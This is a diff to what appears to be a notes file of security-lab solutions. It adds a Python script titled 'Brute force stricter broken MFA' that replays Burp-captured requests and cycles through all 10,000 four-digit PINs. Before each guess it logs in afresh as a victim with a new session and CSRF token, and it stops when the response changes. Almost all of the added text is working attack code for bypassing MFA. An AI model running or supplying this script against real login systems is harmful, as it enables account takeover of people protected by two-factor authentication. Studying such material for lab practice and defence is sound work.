@@ -107,3 +107,80 @@ def brute_force_broken_mfa():
 
 brute_force_broken_mfa()
 ```
+
+## Brute force stricter broken MFA
+```python
+import burpr
+import httpx 
+from bs4 import BeautifulSoup
+import itertools
+
+
+def generate_pin_numbers():
+  return [''.join(list([str(digit) for digit in permutation])) 
+          for permutation in itertools.product(list(range(0, 10)), repeat=4)]
+
+def brute_force_stricter_broken_mfa():
+    victim_login = "xxx"
+    victim_pass = "xxx"
+
+    burp_login_get = burpr.parse_file("./login-get.txt")
+    burp_login_post  = burpr.parse_file("./login-post.txt")
+    burp_login_mfa_get = burpr.parse_file("./login-mfa-get.txt")
+    burp_login_mfa_post = burpr.parse_file("./login-mfa-post.txt")
+
+    client = httpx.Client(http2=True)
+
+    for pin in generate_pin_numbers():
+        # Get CSRF token and session
+        req = burpr.clone(burp_login_get)
+
+        res = client.get(req.url, headers=req.headers)
+        
+        soup = BeautifulSoup(res, "html.parser")
+        session = res.headers.get("set-cookie")
+        csrf = soup.find(attrs={"name": "csrf"})["value"]
+
+        # Log in
+        req = burpr.clone(burp_login_post)
+
+        req.set_header("Cookie", session)
+        req.set_parameter("csrf", csrf)
+        req.set_parameter("username", victim_login),
+        req.set_parameter("password", victim_pass)
+        burpr.prepare(req)
+
+        res = client.post(req.url, headers=req.headers, data=req.body)
+
+        # Get CSRF token and session
+        req = burpr.clone(burp_login_mfa_get)
+
+        session = res.headers.get("set-cookie")
+        req.set_header("Cookie", session)
+        burpr.prepare(req)
+
+        res = client.get(req.url, headers=req.headers)
+
+        soup = BeautifulSoup(res, "html.parser")
+        csrf = soup.find(attrs={"name": "csrf"})["value"]
+
+        # Attempt another MFA pin guess and start again
+        req = burpr.clone(burp_login_mfa_post)
+
+        req.set_header("Cookie", session)
+        req.set_parameter("csrf", csrf)
+        req.set_parameter("username", victim_login),
+        req.set_parameter("password", victim_pass)
+        req.set_parameter("mfa-code", pin)
+        burpr.prepare(req)
+
+        res = client.post(req.url, headers=req.headers, data=req.body)
+
+        print(pin)
+
+        if res.status_code != 200:
+            print(res.status_code, pin, res.headers, res.text)
+            break
+
+brute_force_stricter_broken_mfa()
+```
